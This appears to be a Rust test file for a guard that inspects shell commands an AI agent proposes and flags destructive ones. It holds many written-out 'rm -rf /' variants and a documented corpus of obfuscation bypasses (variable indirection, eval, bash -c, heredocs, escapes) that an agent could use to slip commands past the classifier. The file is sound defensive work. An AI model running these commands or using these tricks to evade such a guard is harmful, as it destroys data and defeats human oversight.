        // the body re-parses through the same envelope that bash -c uses,
        // and the unresolved expansion surfaces as `__indirect_unresolved__`.
        let c = cmds("eval \"$X\"");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved marker, got: {c:#?}"
        );
    }

    #[test]
    fn eval_literal_still_reparsed() {
        // Literal body still re-parsed normally.
        let c = cmds("eval 'rm -rf /etc'");
        assert!(c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]));
    }

    // ── variable indirection (RAN-XXX bypass class) ─────────────────
    //
    // Verified bypass before fix: `a="rm / -rf" && $a` → safe. Root
    // cause: `variable_assignment` was discarded as env-prefix, `$a`
    // surfaced as opaque `simple_expansion`, no rule matched. Fix is a
    // hybrid — resolve $X against lexical bindings when possible,
    // emit `__indirect_unresolved__` marker otherwise.

    #[test]
    fn assignment_then_var_expansion_resolves() {
        // The headline bypass. After fix: resolves to `rm / -rf`, the
        // rm rule fires.
        let c = cmds("a=\"rm / -rf\" && $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "rm"),
            "expected rm command, got: {c:#?}"
        );
    }

    #[test]
    fn assignment_then_braced_expansion_resolves() {
        let c = cmds("a=\"rm -rf /\"; ${a}");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf /, got: {c:#?}"
        );
    }

    #[test]
    fn bash_dash_c_with_var_expands_before_reparse() {
        // `bash -c "$a"` — body comes through unwrap_wrapper as "$a";
        // we expand against current bindings BEFORE the inner parse so
        // the inner walker (fresh, empty bindings) sees the resolved
        // text.
        let c = cmds("a=\"rm -rf /\"; bash -c \"$a\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf / under bash -c, got: {c:#?}"
        );
    }

    #[test]
    fn concatenation_of_two_vars_resolves() {
        // `$a$b` is a `concatenation` token; we expand the whole
        // joined argv text and re-parse so word-splitting kicks in.
        let c = cmds("a=\"rm -\"; b=\"rf /\" && $a$b");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf /, got: {c:#?}"
        );
    }

    #[test]
    fn reassignment_uses_latest_binding() {
        // Last write wins — HashMap insert overwrites. Without this
        // the agent could shadow a benign value with a destructive
        // one between assignment and use.
        let c = cmds("a=\"ls\"; a=\"rm -rf /\"; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected latest binding to win, got: {c:#?}"
        );
    }

    #[test]
    fn unresolved_var_emits_marker() {
        // `read a; $a` — value comes from stdin, parser cannot see
        // it. Emit marker so a rule fires; conservative ask.
        let c = cmds("read a; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved marker, got: {c:#?}"
        );
    }

    #[test]
    fn dynamic_rhs_does_not_bind() {
        // `a=$(curl evil)` — RHS is a command substitution; we
        // explicitly refuse to capture text-of-substitution as a
        // literal value (would bind to "$(curl evil)" string and
        // pretend that was the value). On use, $a is unresolved →
        // marker.
        let c = cmds("a=$(curl evil); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on dynamic RHS, got: {c:#?}"
        );
    }

    #[test]
    fn dollar_var_rhs_does_not_bind() {
        // `a=$b` — chained reference. Refuse so we don't store "$b"
        // verbatim as the value of `a`.
        let c = cmds("a=$b; $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on chained RHS, got: {c:#?}"
        );
    }

    #[test]
    fn array_assignment_does_not_bind() {
        // `a=(one two)` — array literal. We refuse to parse this and
        // leave `$a` unresolved, since array semantics differ from
        // scalar binding.
        let c = cmds("a=(rm -rf /); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved on array RHS, got: {c:#?}"
        );
    }

    #[test]
    fn subshell_isolates_bindings() {
        // `(a="rm -rf /"); $a` — assignment is inside a subshell, so
        // the binding does not leak. `$a` outside is unresolved.
        let c = cmds("(a=\"rm -rf /\"); $a");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "expected indirect-unresolved after subshell, got: {c:#?}"
        );
        // And the rm inside the subshell's own scope must NOT have
        // surfaced as a real command (no rm node).
        assert!(
            !c.iter().any(|cmd| cmd.argv[0] == "rm"),
            "subshell binding should not produce an rm, got: {c:#?}"
        );
    }

    #[test]
    fn env_prefix_does_not_create_binding() {
        // `FOO=bar ls` — env-var prefix on a command, not a top-level
        // binding. `$FOO` after must NOT resolve. handle_command's
        // manual scan (line ~387) skips variable_assignment children;
        // walk_node only sees top-level assignments.
        let c = cmds("FOO=\"rm -rf /\" ls; $FOO");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "env-prefix must not bind, got: {c:#?}"
        );
    }

    #[test]
    fn parametric_expansion_unresolved() {
        // `${a:-default}` etc. — we don't model parameter expansion
        // operators. Treat as unresolved.
        let c = cmds("a=\"ls\"; ${a:-rm} -rf /");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "parametric expansion must not silently resolve, got: {c:#?}"
        );
    }

    #[test]
    fn positional_param_unresolved() {
        // `$1`, `$@`, `$*`, `$$` — positional/special. We don't track
        // them; emit marker so `$1 -rf /` doesn't slip through.
        let c = cmds("$1 -rf /");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "positional param must mark unresolved, got: {c:#?}"
        );
    }

    #[test]
    fn safe_expansion_passes_through() {
        // Sanity: legitimate `a="ls -la" && $a` resolves to ls and
        // does not produce a marker. Without this guard we'd flip
        // every $-headed command to destructive — too noisy.
        let c = cmds("a=\"ls -la\" && $a");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["ls", "-la"]),
            "expected ls -la, got: {c:#?}"
        );
        assert!(
            !c.iter().any(|cmd| cmd.argv[0] == "__indirect_unresolved__"),
            "safe expansion must not emit marker, got: {c:#?}"
        );
    }

    #[test]
    fn quoted_use_still_destructive() {
        // `a="rm -rf /"; bash -c "$a"` — body is "$a" (quoted) which
        // bash would pass as a single arg, but inside `bash -c` the
        // string IS the script. Our expansion produces "rm -rf /";
        // re-parse word-splits as bash itself would.
        let c = cmds("a=\"rm -rf /\"; bash -c \"$a\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/"]),
            "expected rm -rf / under bash -c, got: {c:#?}"
        );
    }

    #[test]
    fn nested_indirection_through_eval() {
        // `eval "$a"` already had its own marker; verify the
        // indirect path doesn't double-fire or swallow it. With
        // bindings this resolves fully; without, eval path emits
        // __eval_dynamic__.
        let c = cmds("a=\"rm -rf /\"; eval \"$a\"");
        // After fix: argv is ["eval", "$a"]; argv[0] is literal so
        // indirect branch doesn't fire; eval-wrapper unwrap returns
        // dynamic marker (because it inspects raw arg text without
        // bindings). That's a separate hardening — record current
        // behaviour: at minimum the destruction is flagged somehow.
        assert!(
            c.iter().any(|cmd| {
                cmd.argv[0] == "__eval_dynamic__"
                    || cmd.argv[0] == "__indirect_unresolved__"
                    || cmd.argv == vec!["rm", "-rf", "/"]
            }),
            "eval of bound var must surface as a destructive signal, got: {c:#?}"
        );
    }

    // ── parse_assignment unit tests ─────────────────────────────────

    #[test]
    fn parse_assignment_basic_double_quoted() {
        assert_eq!(
            parse_assignment("a=\"rm -rf /\""),
            Some(("a".into(), "rm -rf /".into()))
        );
    }

    #[test]
    fn parse_assignment_basic_single_quoted() {
        assert_eq!(
            parse_assignment("a='rm -rf /'"),
            Some(("a".into(), "rm -rf /".into()))
        );
    }

    #[test]
    fn parse_assignment_unquoted_value() {
        assert_eq!(
            parse_assignment("CACHE=builds"),
            Some(("CACHE".into(), "builds".into()))
        );
    }

    #[test]
    fn parse_assignment_rejects_dynamic_rhs() {
        assert_eq!(parse_assignment("a=$(rm)"), None);
        assert_eq!(parse_assignment("a=$b"), None);
        assert_eq!(parse_assignment("a=`rm`"), None);
    }

    #[test]
    fn parse_assignment_rejects_array() {
        assert_eq!(parse_assignment("a=(one two)"), None);
    }

    #[test]
    fn parse_assignment_rejects_invalid_name() {
        assert_eq!(parse_assignment("=value"), None);
        assert_eq!(parse_assignment("1a=value"), None);
        assert_eq!(parse_assignment("a-b=value"), None);
    }

    // ── expand_vars unit tests ──────────────────────────────────────

    fn walker_with_bindings(pairs: &[(&str, &str)]) -> Walker<'static> {
        let mut w = Walker::new(b"");
        for (k, v) in pairs {
            w.bindings.insert((*k).to_string(), (*v).to_string());
        }
        w
    }

    #[test]
    fn expand_vars_simple() {
        let w = walker_with_bindings(&[("a", "rm -rf /")]);
        assert_eq!(w.expand_vars("$a"), Some("rm -rf /".into()));
        assert_eq!(w.expand_vars("${a}"), Some("rm -rf /".into()));
    }

    #[test]
    fn expand_vars_concatenation() {
        let w = walker_with_bindings(&[("a", "rm -"), ("b", "rf /")]);
        assert_eq!(w.expand_vars("$a$b"), Some("rm -rf /".into()));
        assert_eq!(w.expand_vars("${a}${b}"), Some("rm -rf /".into()));
    }

    #[test]
    fn expand_vars_unknown_returns_none() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("$unknown"), None);
    }

    #[test]
    fn expand_vars_dynamic_returns_none() {
        let w = walker_with_bindings(&[("a", "ls")]);
        // Command substitutions inside our text are unresolvable —
        // we cannot peek inside `$(...)` or `` $`...` `` to know what
        // they emit, so the whole text is unsafe to parse as a fixed
        // payload.
        assert_eq!(w.expand_vars("$a $(curl)"), None);
        assert_eq!(w.expand_vars("$`cmd`"), None);
        // Note: bare backticks (not preceded by `$`) are NOT
        // expansion sites for expand_vars's purpose — tree-sitter
        // walks `command_substitution` nodes independently and
        // surfaces inner commands. expand_vars only resolves `$X`
        // forms, so `` `cmd` `` passes through as literal text.
    }

    #[test]
    fn expand_vars_parametric_returns_none() {
        let w = walker_with_bindings(&[("a", "ls")]);
        assert_eq!(w.expand_vars("${a:-default}"), None);
    }

    #[test]
    fn expand_vars_positional_returns_none() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("$1"), None);
        assert_eq!(w.expand_vars("$@"), None);
        assert_eq!(w.expand_vars("$$"), None);
    }

    #[test]
    fn expand_vars_preserves_literals() {
        let w = walker_with_bindings(&[("a", "/tmp")]);
        assert_eq!(
            w.expand_vars("rm -rf $a/cache"),
            Some("rm -rf /tmp/cache".into())
        );
    }

    #[test]
    fn expand_vars_bare_dollar_is_literal() {
        let w = walker_with_bindings(&[]);
        assert_eq!(w.expand_vars("price: $"), Some("price: $".into()));
    }

    // ── envelope predicate corpus (decision.guard-indirection-hardening) ─
    //
    // The full bypass set verified by tribunal (Codex high + Gemini flash)
    // against the headline patch. Each case below was a `safe` verdict
    // before the envelope predicate landed; each must now produce an
    // EffectiveCommand stream that contains either a real destructive
    // command (rm, etc.) OR the `__indirect_unresolved__` marker. The
    // helper asserts one of those holds.

    fn assert_destructive_signal(src: &str) {
        let c = cmds(src);
        let ok = c.iter().any(|cmd| {
            cmd.argv[0] == "__indirect_unresolved__"
                || cmd.argv[0] == "__eval_dynamic__"
                || cmd.argv[0] == "__pipe_to_shell__"
                || cmd.argv == vec!["rm", "-rf", "/"]
                || (cmd.argv.first().is_some_and(|a| a == "rm")
                    && cmd.argv.iter().any(|a| a == "/"))
        });
        assert!(ok, "expected destructive signal for `{src}`, got: {c:#?}");
    }

    fn assert_safe_no_marker(src: &str) {
        let c = cmds(src);
        let bad = c
            .iter()
            .any(|cmd| cmd.argv[0].starts_with("__") && cmd.argv[0].ends_with("__"));
        assert!(!bad, "expected NO marker for legit `{src}`, got: {c:#?}");
    }

    // Bypass set —————————————————————————————————————————————————

    #[test]
    fn corpus_bypass_headline() {
        assert_destructive_signal("a=\"rm -rf /\" && $a");
    }

    #[test]
    fn corpus_bypass_quoted_command_sub_in_rhs() {
        // Codex C1: parse_assignment must refuse RHS containing $(.
        assert_destructive_signal("a=\"$(echo rm) -rf /\"; $a");
    }

    #[test]
    fn corpus_bypass_backslash_escape_in_rhs() {
        // Codex C1b: refuse RHS containing backslash escapes.
        assert_destructive_signal("a=rm\\ -rf\\ /; $a");
    }

    #[test]
    fn corpus_bypass_command_sub_as_head() {
        // Codex C2: command_substitution as command head must produce
        // a destructive signal — either via the inner walked command
        // (rm here) or the unresolved marker.
        assert_destructive_signal("$(echo rm) -rf /");
    }

    #[test]
    fn corpus_bypass_backtick_as_head() {
        // Gemini G1c: backtick command_substitution as head. Pre-fix
        // this caused stack overflow; envelope must terminate and
        // emit a marker.
        assert_destructive_signal("`rm -rf /`");
    }

    #[test]
    fn corpus_bypass_prefix_concat_var() {
        // Gemini G1b: `r$a -rf /` with a="m" — argv[0] doesn't start
        // with $, but contains_var_ref scans full token.
        assert_destructive_signal("a=\"m\"; r$a -rf /");
    }

    #[test]
    fn corpus_bypass_bash_herestring() {
        // Codex H3: `bash <<< "$a"` — here-string body re-parsed through
        // bindings.
        assert_destructive_signal("a=\"rm -rf /\"; bash <<< \"$a\"");
    }

    #[test]
    fn corpus_bypass_source_process_sub() {
        // Codex H4: `source <(...)` — source/. wrapper emits marker.
        assert_destructive_signal("source <(echo rm -rf /)");
    }

    #[test]
    fn corpus_bypass_source_literal() {
        // source/. with any argument — even literal — is opaque.
        assert_destructive_signal("source ./scripts/anything.sh");
    }

    #[test]
    fn corpus_bypass_eval_dynamic() {
        // Codex H5 spirit: eval with unbound var. Now goes through the
        // same path as bash -c, emits indirect-unresolved.
        assert_destructive_signal("eval \"$UNKNOWN\"");
    }

    #[test]
    fn corpus_bypass_bash_dash_c_with_var() {
        assert_destructive_signal("a=\"rm -rf /\"; bash -c \"$a\"");
    }

    #[test]
    fn corpus_bypass_chained_var_rhs() {
        // a=$b; $a — chained reference, refused at parse_assignment,
        // surfaces as unresolved on use.
        assert_destructive_signal("a=$b; $a");
    }

    // Negative set ————————————————————————————————————————————————
    //
    // These MUST NOT be flagged. Without the negative corpus the
    // envelope can drift into over-approximation (Goodhart) — flagging
    // every $-pattern. Each case below is a legitimate command an
    // agent might run; classifying these destructive would break
    // basic productivity.

    #[test]
    fn corpus_negative_resolved_to_safe_command() {
        // Lexically bound var resolves to ls — must not flag.
        assert_safe_no_marker("a=\"ls -la\" && $a");
    }

    #[test]
    fn corpus_negative_plain_ls() {
        assert_safe_no_marker("ls /tmp");
    }

    #[test]
    fn corpus_negative_cd_then_ls() {
        assert_safe_no_marker("cd /tmp && ls");
    }

    #[test]
    fn corpus_negative_git_status() {
        assert_safe_no_marker("git status");
    }

    #[test]
    fn corpus_negative_cargo_test() {
        assert_safe_no_marker("cargo test");
    }

    #[test]
    fn corpus_negative_env_prefix() {
        // env-prefix on command (NOT a top-level binding).
        assert_safe_no_marker("FOO=1 BAR=2 ls -la");
    }

    #[test]
    fn corpus_negative_legit_assignment_no_use() {
        assert_safe_no_marker("CACHE_DIR=/tmp/cache");
    }

    #[test]
    fn corpus_negative_resolved_brace_form() {
        assert_safe_no_marker("a=\"ls\" && ${a} -la");
    }

    #[test]
    fn corpus_negative_pipeline_safe() {
        assert_safe_no_marker("ls | grep foo | wc -l");
    }

    #[test]
    fn corpus_negative_test_arithmetic() {
        // $((...)) is arithmetic expansion, not command substitution
        // in command position. Currently treated as opaque expansion;
        // this is in the noise tail — record current behaviour rather
        // than over-pin.
        let c = cmds("echo $((1 + 2))");
        // Just check echo itself surfaces as a safe command.
        assert!(c.iter().any(|cmd| cmd.argv[0] == "echo"));
    }

    #[test]
    fn corpus_negative_subshell_isolation_no_leak() {
        // `(a="rm -rf /"); $a` — subshell binding doesn't leak,
        // outer $a unresolved. This is correct behaviour; assert
        // we DO emit the marker (the subshell's binding stays inside).
        // Side note: the rm inside the subshell IS executed in real
        // bash too, but the binding doesn't leak — so this is
        // technically a destructive case for the inner rm-via-bound-var
        // path, which we model.
        let c = cmds("(a=\"rm -rf /\"); echo done");
        // No real rm should surface (inside subshell `a=...; echo done`
        // is a no-op); just `echo done` survives.
        let has_destructive = c.iter().any(|cmd| cmd.argv[0] == "rm");
        assert!(!has_destructive, "subshell shouldn't leak rm: {c:#?}");
    }

    #[test]
    fn corpus_negative_command_sub_arg_safe() {
        // `echo $(date)` — substitution in argument position, not head.
        // We surface `date` as a separate inner command (safe);
        // the outer echo is safe. No marker.
        assert_safe_no_marker("echo $(date)");
    }

    // ── tribunal v2 corpus ──────────────────────────────────────────
    //
    // Tribunal v2 (Codex high + Gemini flash, after the v1 envelope
    // patch landed) found these 7 additional bypass classes. Each
    // one's resolution is documented inline.

    #[test]
    fn corpus_v2_heredoc_to_bash() {
        // `bash <<EOF\nrm -rf /\nEOF` — heredoc body fed to shell.
        // redirected_statement handler synthesizes -c BODY.
        assert_destructive_signal("bash <<EOF\nrm -rf /\nEOF\n");
    }

    #[test]
    fn corpus_v2_bash_process_substitution_script() {
        // `bash <(...)` — process substitution as script input.
        // Treated as opaque indirection.
        assert_destructive_signal("bash <(echo rm -rf /)");
    }

    #[test]
    fn corpus_v2_eval_argument_position_injection() {
        // `read a; eval "echo $a"` — body has unresolved expansion in
        // argument position. Pre-fix we re-parsed `echo $a` and let
        // the inner walker see argv[0]=echo (literal, safe). Post-fix
        // we emit the marker on the body BEFORE re-parse.
        assert_destructive_signal("read a; eval \"echo $a\"");
    }

    #[test]
    fn corpus_v2_bash_c_argument_position_injection() {
        assert_destructive_signal("read a; bash -c \"echo $a\"");
    }

    #[test]
    fn corpus_v2_trusted_env_shadow() {
        // `HOME="$(echo rm) -rf /"; $HOME` — refused-to-bind value
        // for a TRUSTED_ENV name must NOT fall through to env.
        // Tainted sentinel blocks the fallback.
        assert_destructive_signal("HOME=\"$(echo rm) -rf /\"; $HOME");
    }

    #[test]
    fn corpus_v2_ansi_c_quoting_decoded() {
        // `$'rm' -rf /` — ANSI-C string is bash-literal "rm" at parse
        // time. decode_token strips the wrapper so the rules layer
        // sees `rm`.
        assert_destructive_signal("$'rm' -rf /");
    }

    #[test]
    fn corpus_v2_backslash_escape_in_head_decoded() {
        // `\r\m -rf /` — bash-literal "rm". decode_token unwraps.
        assert_destructive_signal("\\r\\m -rf /");
    }

    #[test]
    fn corpus_v2_read_clears_stale_safe_binding() {
        // `a="ls"; read a; $a` — `read` mutates `a` from stdin.
        // We can't see the new value; clearing the binding is the
        // safe answer (envelope then emits marker on $a).
        assert_destructive_signal("a=\"ls\"; read a; $a");
    }

    #[test]
    fn corpus_v2_printf_dash_v_clears_binding() {
        assert_destructive_signal("a=\"ls\"; printf -v a 'rm -rf /'; $a");
    }

    // Negative coverage for the new code paths.

    #[test]
    fn corpus_v2_negative_safe_heredoc_to_cat() {
        // Heredoc fed to a non-shell command is just data input.
        assert_safe_no_marker("cat <<EOF\nhello\nEOF\n");
    }

    #[test]
    fn corpus_v2_negative_safe_ansi_c_arg() {
        // `echo $'hi'` — ANSI-C in argument position, not head.
        assert_safe_no_marker("echo $'hi'");
    }

    #[test]
    fn corpus_v2_negative_resolved_home() {
        // `${HOME}/cache` resolves via boot-time env. No marker.
        // (As long as HOME is set in test env, which it always is.)
        let c = cmds("ls ${HOME}/cache");
        assert!(
            c.iter().any(|cmd| cmd.argv[0] == "ls"),
            "expected ls, got: {c:#?}"
        );
        let bad = c
            .iter()
            .any(|cmd| cmd.argv[0].starts_with("__") && cmd.argv[0].ends_with("__"));
        assert!(!bad, "trusted-env resolution shouldn't mark: {c:#?}");
    }
}
